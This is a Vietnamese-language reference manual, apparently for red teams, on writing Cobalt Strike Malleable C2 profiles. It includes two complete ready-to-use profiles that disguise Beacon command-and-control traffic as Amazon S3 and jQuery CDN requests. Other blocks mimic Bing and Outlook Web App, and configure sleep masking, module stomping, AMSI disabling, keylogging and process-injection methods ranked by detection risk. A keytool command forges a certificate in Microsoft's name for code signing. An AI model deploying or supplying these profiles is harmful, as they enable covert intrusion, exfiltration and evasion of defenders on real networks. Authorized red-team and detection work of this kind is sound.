# Cobalt Strike — Tham Khảo Đầy Đủ Malleable C2 Profile (Tiếng Việt)

> Malleable C2 profile kiểm soát mọi khía cạnh của lưu lượng mạng Beacon, biểu diễn trong bộ nhớ, và hành vi post-exploitation. Một profile được thiết kế tốt là biện pháp kiểm soát OPSEC quan trọng nhất.

---

## Mục Lục

1. [Malleable C2 Profile Là Gì?](#1-malleable-c2-profile-là-gì)
2. [Cú Pháp Cơ Bản](#2-cú-pháp-cơ-bản)
3. [Tùy Chọn Toàn Cục](#3-tùy-chọn-toàn-cục)
4. [Block http-get](#4-block-http-get)
5. [Block http-post](#5-block-http-post)
6. [Block http-stager](#6-block-http-stager)
7. [Block dns-beacon](#7-block-dns-beacon)
8. [Block stage](#8-block-stage)
9. [Block post-ex](#9-block-post-ex)
10. [Block process-inject](#10-block-process-inject)
11. [Chứng Chỉ Ký Code](#11-chứng-chỉ-ký-code)
12. [Profile Mẫu Hoàn Chỉnh](#12-profile-mẫu-hoàn-chỉnh)
13. [Xác Thực & Kiểm Tra Profile](#13-xác-thực--kiểm-tra-profile)

---

## 1. Malleable C2 Profile Là Gì?

Malleable C2 profile là file ngôn ngữ đặc tả miền (DSL) (`.profile`) mà Team Server của Cobalt Strike đọc khi khởi động. Nó kiểm soát:

- **Hình dạng lưu lượng HTTP** — headers, URI, cookie, query string, cách mã hóa data
- **Biểu diễn Beacon trong bộ nhớ** — PE header, chuỗi, quyền bộ nhớ
- **Hành vi post-exploitation** — spawnto, AMSI bypass, keylogger, phương thức injection
- **Staging** — cách stager tải Beacon đầy đủ

Profile được tải khi khởi động team server và không thể thay đổi trong khi server đang chạy. Beacon áp dụng profile được cấu hình tại thời điểm tạo ra.

### Tại Sao Profile Quan Trọng Cho Phát Hiện

Cobalt Strike với **profile mặc định** bị hầu hết sản phẩm EDR/NDR phát hiện dễ dàng vì lưu lượng HTTP mặc định trông giống hệt nhau trên tất cả cài đặt CS. Profile mô phỏng ứng dụng hợp lệ (Amazon, Bing, Microsoft Teams) làm cho việc phát hiện ở cấp mạng trở nên khó hơn nhiều.

---

## 2. Cú Pháp Cơ Bản

### Phần Mở Rộng File

```
.profile
```

### Chú Thích

```
# Đây là chú thích
```

### Giá Trị Chuỗi

```
set tên_tùy_chọn "giá_trị";
```

### Block

```
tên_block {
    set tùy_chọn "giá_trị";
    sub_block {
        set tùy_chọn "giá_trị";
    }
}
```

### Transform Dữ Liệu

Transform mô tả cách Cobalt Strike mã hóa/giải mã dữ liệu trước khi đưa lên mạng.

```
# Transform khả dụng (theo thứ tự áp dụng):
append    "chuỗi"      # nối thêm chuỗi literal
prepend   "chuỗi"      # thêm trước chuỗi literal
base64               # mã hóa/giải mã base64
base64url            # base64 an toàn cho URL
mask                 # XOR với khóa 4 byte ngẫu nhiên
netbios              # mã hóa NetBIOS
netbiosu             # NetBIOS chữ hoa
urlencode            # mã hóa URL
print                # in giá trị thô (bước cuối để gửi)
```

Transform được áp dụng theo thứ tự (trên xuống dưới khi gửi, đảo ngược khi nhận):

```
# Ví dụ: base64-encode data Beacon, rồi thêm trước cookie phiên giả
transform-x64 {
    prepend "sessid=";
    base64;
    prepend "data=";
}
```

### Container Lưu Trữ Dữ Liệu

Nơi trong HTTP request để lưu trữ dữ liệu:

```
header   "Tên-Header"   # HTTP header
parameter "tên"         # tham số query string (?tên=giá_trị)
uri-append              # nối vào URI
print                   # body (dùng cho POST)
```

---

## 3. Tùy Chọn Toàn Cục

Đặt ở đầu profile:

```
# Khoảng thời gian sleep Beacon (mili giây)
set sleeptime "60000";         # mili giây! (60000 = 60 giây)

# Phần trăm jitter sleep
set jitter "20";

# Kích thước tối đa request GET (byte)
set maxdns "255";

# Cách Beacon tự xác định
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

# Staging host
set host_stage "off";          # không staging nếu stageless

# Tên pipe cho SMB Beacon
set pipename "mojo.5688.8052.183894939787088877##";
set pipename_stager "mojo.5688.8052.##";

# Port TCP Beacon
set tcp_port "4444";

# Banner SSH Beacon
set ssh_banner "OpenSSH_7.4 FreeBSD (protocol 2.0)";
```

---

## 4. Block http-get

Định nghĩa cách Beacon **check-in** và tải nhiệm vụ.

```
http-get {

    set uri "/search";           # URI Beacon dùng cho GET request
    set verb "GET";              # Phương thức HTTP

    client {
        # Header Beacon gửi
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Referer" "https://www.google.com/";
        header "Accept-Encoding" "gzip, deflate";

        # Nơi lưu session ID (metadata)
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {
        # Header Team Server gửi trong response
        header "Content-Type" "text/html; charset=utf-8";
        header "Cache-Control" "no-cache";
        header "Server" "nginx";

        # Nơi ẩn nhiệm vụ Beacon trong response
        output {
            netbios;
            prepend "<!DOCTYPE html><html><head><title>Loading...</title></head><body><p>";
            append "</p></body></html>";
            print;
        }
    }
}
```

### Ví Dụ Đầy Đủ — Mô Phỏng Bing Search

```
http-get {
    set uri "/search";

    client {
        header "Host" "www.bing.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "keep-alive";

        metadata {
            base64url;
            prepend "q=";
            parameter "q";
        }
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "Cache-Control" "private, max-age=0";
        header "X-MSEdge-Ref" "Ref A: ";

        output {
            netbios;
            prepend "<!-- data -->";
            append "<!-- /data -->";
            print;
        }
    }
}
```

---

## 5. Block http-post

Định nghĩa cách Beacon **gửi kết quả** về Team Server.

```
http-post {

    set uri "/collect";
    set verb "POST";

    client {
        header "Accept" "*/*";
        header "Content-Type" "application/x-www-form-urlencoded";

        # Session ID trong cookie
        id {
            parameter "id";
        }

        # Output được exfiltrate trong POST body
        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "text/html";

        output {
            print;
        }
    }
}
```

### Ví Dụ — POST Mô Phỏng Outlook Web App

```
http-post {
    set uri "/owa/auth/logon.aspx";
    set verb "POST";

    client {
        header "Accept" "text/html,application/xhtml+xml,*/*;q=0.8";
        header "Content-Type" "application/x-www-form-urlencoded";
        header "Referer" "https://mail.corp.com/owa/auth/logon.aspx";

        id {
            base64url;
            prepend "clbl=1&url=https%3A%2F%2Fmail.corp.com%2Fowa%2F&EMailAddress=";
            append "&password=";
            print;
        }

        output {
            base64url;
            prepend "flags=4&forcedownlevel=0&trusted=0&username=";
            print;
        }
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "X-Frame-Options" "SAMEORIGIN";

        output {
            print;
        }
    }
}
```

---

## 6. Block http-stager

Định nghĩa cách **stager** tải payload Beacon đầy đủ.

```
http-stager {
    set uri_x86 "/favicon.ico";
    set uri_x64 "/logo.png";

    client {
        header "Accept" "image/avif,image/webp,*/*";
        header "Referer" "https://www.corp.com/";
    }

    server {
        header "Content-Type" "image/x-icon";
        header "Cache-Control" "max-age=86400";

        output {
            print;
        }
    }
}
```

> Với payload stageless, `http-stager` không cần thiết. Ưu tiên stageless cho OPSEC tốt hơn.

---

## 7. Block dns-beacon

Kiểm soát hành vi DNS Beacon.

```
dns-beacon {
    # DNS resolver để dùng
    set dns_resolver "8.8.8.8";

    # Thời gian sleep cho DNS mode (mili giây)
    set dns_sleep "5000";

    # Độ dài tối đa hostname DNS mỗi request
    set maxdns "255";

    # DNS A record dùng làm chỉ báo "dead" (idle)
    set dns_idle "8.8.8.8";

    # Sub-domain cho các loại request khác nhau
    set dns_stager_subhost ".stage.";
    set dns_stager_prepend ".wwwds.";
}
```

### Luồng Giao Tiếp DNS Beacon

```
Beacon → DNS A query: <data_mã_hóa>.c2.corp.com → Team Server (NS ủy quyền)
Team Server → DNS A response: <nhiệm_vụ_mã_hóa_dạng_IP>
```

Chế độ băng thông cao hơn:
```
Beacon → DNS TXT query: <data>.c2.corp.com → lên đến 255 byte mỗi record
Beacon → DNS AAAA query → 16 byte (IPv6) mỗi record
```

---

## 8. Block stage

Kiểm soát cách Beacon được **tải vào bộ nhớ** — block quan trọng nhất cho né tránh in-memory.

```
stage {

    # Thao tác PE Header
    set stomppe      "true";         # ghi đè PE header bằng rác sau khi tải
    set obfuscate    "true";         # xáo trộn reflective loader
    set userwx       "false";        # không dùng bộ nhớ RWX (W^X)
    set smartinject  "true";         # dùng địa chỉ chính xác từ PEB
    set cleanup      "true";         # xóa PE Beacon khỏi bộ nhớ sau khi tải

    # Sleep masking — XOR-encrypt heap/stack Beacon khi ngủ
    set sleep_mask   "true";

    # MZ/PE header giả
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe     "PE";

    # Stack duplication khi ngủ (CS 4.5+)
    set stackspoof   "true";

    # Module masquerading — ánh xạ Beacon lên vùng nhớ của DLL hợp lệ
    set module_x86   "wwanmm.dll";
    set module_x64   "wwanmm.dll";

    # Transform-x86 / transform-x64: sửa đổi shellcode thô trước khi nhúng vào payload
    transform-x86 {
        prepend "\x90\x90\x90\x90";           # 4-byte NOP sled
        strrep  "ReflectiveDll.dll" "";        # xóa chuỗi nhận dạng
        strrep  "beacon.dll" "";
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90";
        strrep  "ReflectiveDll.dll" "";
        strrep  "beacon.dll" "";
    }

    # Chuỗi cần xóa khỏi Beacon đã biên dịch
    stringw "ReflectiveLoader";
    string  "beacon.dll";
}
```

### Bố Cục Bộ Nhớ với `userwx false`

Không có `userwx false`: Beacon nằm trong bộ nhớ RWX — máy quét bộ nhớ phát hiện dễ dàng.  
Với `userwx false`: Beacon nằm trong bộ nhớ RX; reflective loader ghi vào vùng RW riêng biệt rồi chuyển đổi.

### Module Stomping / Masquerading

```
set module_x64 "wwanmm.dll";
```

Beacon sẽ tự tải **đè lên** bản sao mapped của `wwanmm.dll` trong tiến trình mục tiêu. Thay vì vùng nhớ `MEM_PRIVATE` ẩn danh (đáng ngờ), bộ nhớ Beacon xuất hiện như vùng `MEM_IMAGE` được hỗ trợ bởi module hợp lệ.

---

## 9. Block post-ex

Kiểm soát hành vi post-exploitation (spawn-to, AMSI, phương thức injection, v.v.).

```
post-ex {

    # Tiến trình để spawn cho post-ex jobs (fork&run)
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\system32\\dllhost.exe";

    # Obfuscate output khi nằm trong bộ nhớ
    set obfuscate "true";

    # Smart injection: dùng bộ nhớ module-backed cho code được inject
    set smartinject "true";

    # Vô hiệu hóa AMSI trong tiến trình spawnto
    set amsi_disable "true";

    # Cài đặt keylogger
    set keylogger "GetAsyncKeyState";    # hoặc "SetWindowsHookEx"

    # Tên pipe cho post-ex comms
    set pipename "Winsock2\\CatalogChangeListener-###-0";
}
```

### Các Tùy Chọn Keylogger

| Tùy chọn | Phương thức | Ghi chú |
|---|---|---|
| `GetAsyncKeyState` | Poll API trong vòng lặp chặt | Hoạt động cho mọi user, không hook, ít bị phát hiện |
| `SetWindowsHookEx` | Cài đặt keyboard hook | Đáng tin cậy hơn cho app nền, dễ thấy hơn |

---

## 10. Block process-inject

Kiểm soát cách Beacon inject code vào tiến trình khác.

```
process-inject {

    # Kích thước allocation tối thiểu (đệm để tránh phát hiện page-exact allocation)
    set min_alloc "16384";

    # Phương thức allocation
    set startrwx   "false";     # cấp phát RW trước, rồi đổi thành RX
    set userwx     "false";     # không bao giờ dùng RWX

    # Transform: sửa đổi shellcode trước khi inject
    transform-x86 {
        prepend "\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90";
    }

    # Cách thực thi code đã inject:
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateRemoteThread;
        NtQueueApcThread-s;
        SetThreadContext;
        RtlCreateUserThread;
        NtQueueApcThread;
    }
}
```

### Giải Thích Các Phương Thức Thực Thi Injection

| Phương thức | Mô tả | Rủi ro phát hiện |
|---|---|---|
| `CreateRemoteThread` | Injection cổ điển | Cao — thường xuyên được giám sát |
| `NtQueueApcThread` | APC injection vào thread hiện có | Trung bình |
| `NtQueueApcThread-s` | APC vào thread bị treo | Thấp hơn |
| `SetThreadContext` | Chiếm đoạt ngữ cảnh thread hiện có | Trung bình |
| `RtlCreateUserThread` | Hàm NT không có tài liệu | Thấp hơn CreateRemoteThread |
| `CreateThread` | Tạo thread local (inject chính mình) | Thấp |

---

## 11. Chứng Chỉ Ký Code

Payload Beacon có thể được ký code để vượt qua kiểm tra chữ ký.

```
code-signer {
    set keystore "keystore.jks";
    set password "matkhau";
    set alias    "server";
    set timestamp "true";
    set timestamp_url "http://timestamp.verisign.com/scripts/timstamp.dll";
    set digest_algorithm "SHA-256";
}
```

Tạo chứng chỉ self-signed (trên máy operator):
```bash
keytool -genkey -alias server -keyalg RSA -keysize 2048 -keystore keystore.jks -storepass matkhau -validity 3650 -dname "CN=Microsoft Corporation, OU=Windows, O=Microsoft, L=Redmond, ST=Washington, C=US"
```

---

## 12. Profile Mẫu Hoàn Chỉnh

### Profile A — Mô Phỏng Amazon S3

```
set sleeptime "5000";
set jitter    "20";
set useragent "aws-sdk-go/1.44.0 (go1.18.3; linux; amd64)";

http-get {
    set uri "/s3/bucket/objects/list";

    client {
        header "Accept"          "*/*";
        header "Content-Type"    "application/xml";
        header "X-Amz-Date"     "20230601T120000Z";

        metadata {
            base64url;
            prepend "X-Amz-Cf-Id=";
            header "X-Amz-Cf-Id";
        }
    }

    server {
        header "Content-Type"   "application/xml";
        header "x-amz-request-id" "TX00000000000000000";
        header "Server"        "AmazonS3";

        output {
            netbios;
            prepend "<?xml version=\"1.0\" encoding=\"UTF-8\"?><ListBucketResult>";
            append  "</ListBucketResult>";
            print;
        }
    }
}

http-post {
    set uri "/s3/bucket/objects/put";
    set verb "PUT";

    client {
        header "Content-Type" "application/octet-stream";

        id {
            base64url;
            prepend "upload_id=";
            parameter "upload_id";
        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/xml";
        output { print; }
    }
}

stage {
    set stomppe    "true";
    set userwx     "false";
    set sleep_mask "true";
    set cleanup    "true";
    set obfuscate  "true";
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\system32\\dllhost.exe";
    set amsi_disable "true";
    set obfuscate   "true";
}
```

### Profile B — Mô Phỏng jQuery CDN

```
set sleeptime "3000";
set jitter    "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0";

http-get {
    set uri "/jquery-3.7.1.min.js";

    client {
        header "Host"   "code.jquery.com";
        header "Accept" "*/*";
        header "Referer" "https://www.corp.com/";

        metadata {
            base64url;
            prepend "__utm=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type"  "application/javascript; charset=utf-8";
        header "Cache-Control" "public, max-age=31536000";

        output {
            netbiosu;
            prepend "/*! jQuery v3.7.1 | (c) OpenJS Foundation | jquery.org/license */";
            append  "//# sourceMappingURL=jquery-3.7.1.min.js.map";
            print;
        }
    }
}

http-post {
    set uri "/jquery-3.7.1.min.js";
    set verb "POST";

    client {
        header "Content-Type" "application/x-www-form-urlencoded; charset=UTF-8";
        header "X-Requested-With" "XMLHttpRequest";

        id {
            base64url;
            prepend "callback=jQuery";
            parameter "callback";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/javascript";
        output { print; }
    }
}

stage {
    set stomppe    "true";
    set obfuscate  "true";
    set userwx     "false";
    set sleep_mask "true";
    set cleanup    "true";
    set module_x64 "xpsservices.dll";
    set module_x86 "xpsservices.dll";
}

post-ex {
    set spawnto_x86  "%windir%\\syswow64\\svchost.exe";
    set spawnto_x64  "%windir%\\system32\\svchost.exe";
    set amsi_disable "true";
    set obfuscate    "true";
}

process-inject {
    set min_alloc "16384";
    set startrwx  "false";
    set userwx    "false";
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        NtQueueApcThread-s;
        RtlCreateUserThread;
    }
}
```

---

## 13. Xác Thực & Kiểm Tra Profile

### `c2lint` — Công Cụ Xác Thực Tích Hợp

```bash
# Chạy c2lint trước khi khởi động team server
./c2lint <profile.profile>

# Output mong đợi:
[+] Profile (example.profile) được phân tích thành công!
[-] Profile (example.profile) có lỗi:
    dòng 42: Tùy chọn không xác định 'badoption'
```

Luôn chạy `c2lint` sau khi chỉnh sửa. Profile không hợp lệ về cú pháp sẽ làm crash team server khi khởi động.

### Xác Thực Lưu Lượng Mạng

Sau khi triển khai Beacon với profile, dùng Wireshark để xác minh:

```
# Capture trên interface team server
tcpdump -i eth0 -w capture.pcap port 80 or port 443

# Kiểm tra:
# - URI khớp với thiết lập profile
# - Header khớp với thiết lập profile
# - Mã hóa payload đúng
# - Không có chuỗi CS rõ ràng trong HTTP body
```

### Công Cụ Kiểm Tra Profile

- **cs-decrypt-metadata** — giải mã lưu lượng Beacon trực tiếp
- **malleable-c2-randomizer** — tạo biến thể profile ngẫu nhiên
- **rsmudge/malleable-c2-profiles** — bộ sưu tập profile cộng đồng
- **threatexpress/malleable-c2** — bộ sưu tập profile red team
- **pe-sieve / moneta** — phát hiện Beacon được cấu hình không đúng trong bộ nhớ

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
